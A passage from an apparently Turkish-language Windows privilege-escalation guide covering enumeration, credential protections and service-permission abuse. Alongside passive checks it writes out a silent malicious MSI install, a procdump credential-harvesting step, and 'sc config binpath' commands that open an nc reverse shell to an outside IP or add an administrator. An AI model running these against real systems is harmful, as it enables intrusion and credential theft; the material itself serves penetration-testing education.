  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse platformu x64 olarak ayarladığınızdan emin olun.

### MSI'ı yükleme

Kötü amaçlı `.msi` dosyasının **yüklemesini** arka planda çalıştırmak için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu güvenlik açığından yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Tespit Araçları

### Denetim Ayarları

Bu ayarlar nelerin **günlüğe kaydedileceğini** belirler; bu yüzden dikkat etmelisiniz.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding'de logların nereye gönderildiğini bilmek ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarını yönetmek** için tasarlanmıştır; her parolanın **benzersiz, rastgele oluşturulmuş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izinlere sahip kullanıcılara erişim izni verilir. Böylece yetkili kullanıcılar yerel admin parolalarını görüntüleyebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** ile birlikte Microsoft, sistemi daha da güvenli hâle getirmek için güvenilmeyen işlemlerin LSA belleğini **okuma** veya kod enjekte etme girişimlerini **engellemek** amacıyla Local Security Authority (LSA) için gelişmiş koruma sundu.\
[**LSA Protection hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10** ile kullanıma sunuldu. Amacı, cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Yerel Güvenlik Yetkilisi** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz ayrıcalıklarınızı yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalıklarınızı yükseltmek için bunları nasıl kötüye kullanabileceğiniz hakkında buradan bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

Bu sayfada **token**'ın ne olduğu hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç token'lar hakkında bilgi edinmek** ve bunları nasıl kötüye kullanabileceğinizi öğrenmek için aşağıdaki sayfaya göz atın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Ana klasörler

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola İlkesi

```bash
net accounts
```

### Panonun içeriğini al

```bash
powershell -command "Get-Clipboard"
```

## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Öncelikle, süreçleri listelerken **sürecin komut satırında parola olup olmadığını kontrol edin**.\
**Çalışan herhangi bir binary'nin üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking saldırılarından**](dll-hijacking/index.html) yararlanmak için binary klasöründe yazma izinleriniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; bunları ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz.

Bir debugger listener kısa süreliğine çalışıyor olabilir; bu nedenle tek bir pasif port anlık görüntüsünde görünmemesi, hiçbir zaman dışarıya açık olmadığı anlamına gelmez. Gözlemlenen listener'ı PID'si, süreç sahibi ve daha düşük ayrıcalıklı kullanıcının ona erişip erişemediğiyle ilişkilendirin; tek başına uygulama adı veya debug flag'i, kullanıcılar arası code execution olduğunu kanıtlamaz. Rutin keşif işlemlerini pasif tutun; debugger komutları göndermeyin.

**Süreçlerin binary dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Süreç ikili dosyalarının bulunduğu klasörlerin izinlerini denetleme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, `snort.exe -c <config>` ile seçilen yapılandırmada tanımlanan `dynamicpreprocessor directory` konumundan paylaşımlı kitaplıklar yükleyebilir. Snort'u farklı bir hesap altında çalıştıran zamanlanmış görev veya hizmet için tam yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız bu dizinde dosya oluşturabiliyorsa, görev veya hizmet modülleri bir sonraki yüklediğinde bu yol kod yürütme açısından incelenmeye değer bir adaydır. Çalıştırma hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve tüm engelleme veya paylaşım kısıtlamalarını doğrulayın; yalnızca dizinin yazılabilir olması, ayrıcalık yükseltmenin mümkün olduğunu kanıtlamaz. [Snort'un dynamic-preprocessor belgeleri](https://www.snort.org/documents/dpx-readme), çalışma zamanında modül yüklemeyi açıklar.

### Yazılabilir belge köküne sahip ayrıcalıklı web hizmeti

Windows Apache kurulumunda, hizmetin yürütülebilir dosya yolunu ve çalıştırma hesabını, etkin `httpd.conf` içindeki `DocumentRoot` ile karşılaştırın. Yaygın bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış belge kökünün (genellikle `C:\xampp\htdocs`) ACL'sini inceleyin. Apache `LocalSystem` olarak çalışırken düşük ayrıcalıklı bir kullanıcı bu kökte dosya oluşturabiliyorsa, sunucu tarafında kod yürütme ana makinenin ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam yolun sunulduğunu ve sunucu tarafında bir işleyicinin dosya türünü işlediğini doğrulayın; tek başına yazılabilir bir kök yalnızca dosya oluşturulabildiğini kanıtlar. Deneme dosyası yazmadan ACL'leri inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Geleneksel bir WAMP kurulumunda hizmet, sürümlü bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasını (32 bitlik düzende `C:\wamp\...`) gösterebilir; yapılandırma da bu dosyanın yanındaki `conf\httpd.conf` altında, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` olabilir. Hizmetin tam olarak hangi çalıştırılabilir dosyayı kullandığını, hangi kullanıcı kimliğiyle çalıştığını, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dahil) ve kök dizinin ACL'sini birlikte kontrol edin. Yazılabilir bir WAMP dizini, Apache'nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı yürüttüğünü kanıtlamaz. [Apache, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini belgeliyor](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kökü ve uygulama havuzunun ağ kimliği

IIS için, yazılabilir bir fiziksel dizini `applicationHost.config` içindeki **etkin bir siteye/uygulamaya** eşleyin; ardından yapılandırılmış havuzu ve sunucu tarafı işleyicisini belirleyin. Sunulan bir dizine konan kod, yalnızca IIS bu dosya türünü işliyorsa ve ilgili yola erişilebiliyorsa havuz kimliğiyle çalışır. Yazılabilir bir dizinin kod yürütmeye olanak sağladığı sonucuna varmadan önce mevcut kullanıcının etkin dosya oluşturma izinlerini, sitenin çalışma durumunu, işleyiciyi ve yola özgü geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi, ayrıca incelenmesi gereken bir yol oluşturur: uygulamanın derleme dizini altındaki oluşturulmuş dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bu konumu değiştirebilir. [Microsoft, konumu ve uygulama başına alt dizinleri belgeliyor](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzları birbirine güvenmiyorsa derleme dizinlerinin yalıtılmasını öneriyor](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir token, **belirli** uygulamanın önbelleğindeki oluşturulmuş kaynak dosyalarını değiştirebiliyorsa, bu uygulamanın onları daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Bir dosyanın veya dizinin ACL'si tek başına code execution olduğunu kanıtlamaz: önbelleği etkin uygulama, etkin token ve ACL, derleme ayarları, işlem kimliği ve yeniden derleme zamanlamasıyla birlikte değerlendirin. Salt okunur metadata incelemesi yapın; tarama sırasında derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token'ı düşük ayrıcalıklı olsa bile genellikle etki alanı kaynaklarında **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` yerelde zaten yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise normalde ağda anonim kimlik bilgileri sunar. `SpecificUser` havuzu, yapılandırılmış hesabını kullanır. [Microsoft bu kimlik türlerini belgeliyor](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini açıklıyor](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Kimlik ayarının belirtilmemesi, IIS sürümleri arasında farklılık gösteren havuz varsayılanlarının devralınmasına yol açabilir; bu nedenle havuz adından tahminde bulunmak yerine etkin yapılandırmayı belirleyin. Code execution, bilgisayar hesabı ağ kimliğine sahip bir havuza ulaşıyorsa, **ilgili bilgisayarın** dizin izinlerini değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma izinleri gerektirir; tek başına bir makine hesabı bileti veya ana bilgisayar rolü bu izinlerin varlığını kanıtlamaz. Pasif taramada dosya yüklemeden, ağda kimlik doğrulaması yapmadan veya bilet istemeden yapılandırmaları ve ACL'leri inceleyin.

Yardımcı bir işlem başlatan ve okunabilir olan bir ASP.NET işleyicisi için, istekten türetilen tüm değerleri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma aşamalarında izleyin. Kod içinde çözümlenmiş bir token'ı `ProcessStartInfo("cmd", "/c ...")` ile birleştiren bir işleyici, kabuk meta karakterlerinin komutu değiştirmesine olanak sağlayabilir; [Microsoft, `cmd` özel karakterlerini belgeliyor](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağıranın çözümlenmiş değeri gerçekten etkileyebildiğini ve işleyiciye erişebildiğini doğrulayın; ardından etkin uygulama havuzu veya taklit edilen kimliği ve alt sürecin kimliğini belirleyin. Okunabilir bir kaynak kod satırı, localhost dinleyicisi veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut yürütmeyi kanıtlamaz. Pasif tarama sırasında sahte istekler göndermeden veya yardımcı programı çalıştırmadan kaynak kodu ve havuz yapılandırmasını inceleyin.

Windows üzerindeki bir PHP hizmetinde, istek tarafından denetlenen ve [`include` veya `require`](https://www.php.net/manual/en/function.include.php) içine aktarılan bir yol, düşük ayrıcalıklı kullanıcının yazabildiği bir PHP dosyasını worker kimliğiyle değerlendirebilir. İsteğin bu ifadeye ulaşabildiğini, çözümlenen yolun düşük ayrıcalıklı kullanıcının değiştirebildiği ve worker'ın okuyabildiği bir dosyayı gösterdiğini, PHP yol kısıtlamalarının include işlemine izin verdiğini ve worker'ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Loopback dinleyicisi veya yazılabilir dosya tek başına bu zinciri kanıtlamaz; pasif tarama sırasında uç noktayı çağırmadan kaynak kodu, hizmet kimliğini ve dosya ACL'lerini inceleyin.

### Bellekten parola madenciliği

Sysinternals'tan **procdump** kullanarak çalışan bir işlemin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerin kimlik bilgileri bellekte **açık metin olarak** bulunabilir; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, ardından "Click to open Command Prompt" seçeneğine tıklayın.

### Ayrıcalıklı proje dosyası içe aktarma

Daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcı hesabı altında bir girdi güven sınırını aşar. **Tam yazılabilir yolu**, bu yolu açan süreci veya görevi, etkin kimliğini ve parser sürümünü inceleyin. [Geçmişteki bir Ghidra proje açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje metadata'sında XML external entity'lerine izin veriyordu; Windows'ta bir ağ entity'si, [giden SMB ve NTLM ilkesi](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa içe aktarma hesabından kimlik doğrulamaya neden olabilirdi. Bu, kimlik bilgilerinin açığa çıkabileceğine dair bir işarettir; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı, yetkili veya savunmasız bir yol üzerinden kullanılabilmesi gerekir ve mevcut sürümler gerçek yama durumlarına göre değerlendirilmelidir. Pasif keşif sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` izni](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki izinlerden ayrıdır. Bu izin için salt okunur başarılı bir [`OpenSCManager` erişim isteği](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw), incelemeye değer bir bulgudur; yeni bir hizmetin çalışabileceğinin kanıtı değildir. [`CreateService`, bir handle döndürür](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew); bu handle, oluşturma sırasında istenen hizmet erişimine sahiptir. Hizmet daha sonra yeniden açıldığında ayrı bir erişim denetimi yapılır ve ilk handle kullanılabilir olsa bile bu işlem başarısız olabilir. Etkin yerel veya uzak token'ı, verilen handle izinlerini, hizmet hesabını, başlatma ilkesini ve çalıştırılabilir dosyanın yolunu ayrı ayrı doğrulayın. Pasif keşif sırasında hizmet oluşturmayın veya başlatmayın.

Uzak hizmet yükleme yolu için, söz konusu SCM izinlerini hedefte aynı ağ oturum açma işleminin yazabildiği bir paylaşımla, paylaşımın temelindeki NTFS ACL'siyle ve hizmet hesabının çalıştırabileceği yerel bir çalıştırılabilir dosya yoluyla birlikte değerlendirin. Olağandışı ölçüde geniş SCM izinleri ve dosya yerleştirme yolu birlikte mevcutsa yönetici olmayan bir hesap bu sınırı aşabilir; yönetim paylaşımı zorunlu değildir. Yalnızca paylaşımda yazma izni veya yalnızca SCM hizmet oluşturma bulgusu, yeni hizmetin daha yüksek bir kimlikle başlatılabileceğini göstermez.

Mevcut bir hizmet, yardımcı dosya `ImagePath` içinde bulunmasa bile başlangıç, kapanış veya başka bir yaşam döngüsü olayı sırasında bir yardımcı çalıştırılabilir dosyayı çağırabilir. Yardımcı dosyanın adı, daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir dizine çözümleniyorsa ve hizmet daha yüksek bir kimlikle çalışıyorsa eksik yardımcı dosya koşullu bir değiştirme adayıdır. **Gerçek hizmet kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen çalıştırılabilir dosya yolunu ve arama sırasını, dizin oluşturma izinlerini, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına hizmetin bu dosyayı yükleyeceğini göstermez; pasif incelemede hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmet için [`SERVICE_START`, `StartService` işlevine argüman sağlamaya izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu izin [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) izninden farklıdır. Başlatma iznini yalnızca bir denetim hakkından fazlası olarak değerlendirmeden önce hizmetin kodunu veya belgelenmiş arayüzünü inceleyin. Hizmet, çağıranın seçtiği bir argümanı günlük veya dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, argümandan yazma işlemine giden tam akışı, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korumalı bir dizine yazma işlemi, yalnızca ayrıcalıklı bir tüketici veya yükleyici bu dosyayı kabul ediyorsa ayrıcalık yükseltmeye yol açabilir; yazılabilir bir günlük veya başlatma izni tek başına yeterli değildir. Pasif envanter çıkarma sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

NSClient++ izleme aracında okunabilir bir `nsclient.ini`, **yapılandırmayı incelemeye değer bir bulgudur**: dosya web kimlik bilgilerini içerebilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB listener'ını ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya script'leri değiştirip değiştiremeyeceğini kontrol edin. Ayrıcalıklı çalıştırma için ayrıca `CheckExternalScripts` (veya etkin başka bir çalıştırma yolu), bir komutu kaydetme ya da değiştirme konusunda etkin bir izin ve komutu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca loopback'i dinleyen bir listener'a yerel kullanıcı yine de erişebilir; ancak dosya yolu, parola veya listener tek başına bu izinleri kanıtlamaz. Pasif keşif sırasında sırları görüntülemeden veya web API'sini çağırmadan metadata'yı ve izinleri inceleyin. [NSClient++ dosya düzenine](https://nsclient.org/docs/concepts/file-layout/), [web ve script güvenliği kılavuzuna](https://nsclient.org/docs/setup/securing/) ve [harici script yapılandırmasına](https://nsclient.org/docs/reference/check/CheckExternalScripts/) bakın.

`ImagePath` değeri `nssm.exe` olan bir hizmet için hizmetin gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM, alt uygulamayı burada saklar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h); `AppDirectory` ise yapılandırılmış çalışma dizinidir. Wrapper'ın izinlerini hizmet sınırının tamamı olarak değerlendirmeden önce alt çalıştırılabilir dosyayı ve üst dizin ACL'lerini kontrol edin. Bu alt uygulamanın açığa çıkardığı yerel bir WCF veya SOAP endpoint'i ayrı bir inceleme bulgusudur: düşük ayrıcalıklı kullanıcının listener'a erişebildiğini, ilgili işlemin kullanıcının girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlik altında gerçekleştirdiğini doğrulayın. Hizmet hesabı, endpoint URL'si veya yazılabilir bir yol tek başına ayrıcalık yükseltmeyi kanıtlamaz; pasif keşif sırasında hizmet işlemlerini çağırmayın.

Özel bir WCF işlemi için çağıranın denetlediği bir string'in herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript`, script metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), [`Pipeline.Invoke` ise pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows transport credentials kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **ilgili belirli** işlemi çağırma yetkisi ve runspace'in etkin kimliği ayrıca kontrol edilmelidir. Düşük ayrıcalıklı bir çağıranın girdisinden daha yüksek ayrıcalıklı bir hizmet kimliği altında `AddScript`'e giden yol bir kod yürütme sınırıdır; dinleyen bir port, kimliği doğrulanmış bir istemci veya ilgisiz bir assembly'deki kullanılmayan bir yöntem tek başına kanıt değildir. Keşif sırasında endpoint'i çağırmadan dağıtılmış hizmeti, contract'ı, yetkilendirmeyi ve impersonation ayarlarını statik olarak inceleyin.

Service Triggers, belirli koşullar oluştuğunda (named pipe/RPC endpoint etkinliği, ETW olayları, IP kullanılabilirliği, cihaz bağlanması, GPO yenilemesi vb.) Windows'un bir hizmeti başlatmasını sağlar. SERVICE_START izinleri olmadan da tetikleyicileri çalıştırarak ayrıcalıklı hizmetleri başlatmak çoğu zaman mümkündür. Keşif ve etkinleştirme teknikleri burada:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcı hizmeti

C/C++ araçlarını içeren Visual Studio kurulumlarında, `LocalSystem` olarak çalışacak şekilde yapılandırılmış bir tanılama hizmeti olan `VSStandardCollectorService150` bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), hizmet DACL sıfırlamasını yönlendirmek için bir junction ve object-manager-link yarış koşulundan yararlandı. Gösterilen ayrıcalık yükseltme ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolunu ve `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefini gerektiriyordu. Bileşen Ocak 2024'te düzeltildi.

Pasif ilk incelemede yalnızca bu hizmetin hesabını ve binary path'ini inceleyin, Setup WMI derleyici yolunun mevcut olup olmadığını kontrol edin ve yüklü bileşenin yama durumunu doğrulayın. Bir hizmet kaydı, Visual Studio ürün sürümü veya derleyici dosyası tek başına ana makinenin savunmasız olduğunu göstermez. İnceleme için hizmeti başlatmak veya onarım çalıştırmak gerekmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi edinmek için **sc** kullanabilirsiniz

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_’tan **accesschk** binary’sinin bulunması önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirebilip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı bırakılmış veya etkin cihazlarla ilişkilendirilmemiş._

Aşağıdakini kullanarak etkinleştirebilirsiniz

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu unutmayın (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Servis binary path'ini değiştirme**

"Authenticated users" grubunun bir servis üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir binary dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Servisi yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Yetkiler çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Hizmet ikili dosyasının yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve böylece hizmet yapılandırmalarının değiştirilmesine olanak tanır.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Hizmet yapılandırmalarını değiştirme yetkisini de sağlar.
- **GENERIC_ALL**: Hizmet yapılandırmalarını değiştirme yetkisini de sağlar.

Bu güvenlik açığının tespiti ve istismarı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Hizmet ikili dosyalarında zayıf izinler

Bir hizmet **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir etki alanı hesabı olarak çalışıyorsa, ancak **düşük ayrıcalıklı kullanıcılar hizmet EXE dosyasını veya üst klasörünü değiştirebiliyorsa**, hizmet genellikle **ikili dosya değiştirilip hizmet yeniden başlatılarak** ele geçirilebilir.

Bir hizmet tarafından çalıştırılan **ikili dosyayı değiştirebilip değiştiremeyeceğinizi** veya ikili dosyanın bulunduğu **klasör üzerinde yazma izniniz olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html)**.**\
Bir hizmet tarafından çalıştırılan tüm ikili dosyaları **wmic** (system32 içinde değil) kullanarak listeleyebilir ve **icacls** ile izinlerinizi kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** de kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** için verilmiş tehlikeli ACL’leri, özellikle hizmet çalıştırılabilir dosyasında veya onu içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Pratik bir kötüye kullanım akışı şöyledir:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve çalıştırılabilir dosyanın yolunu doğrulayın.
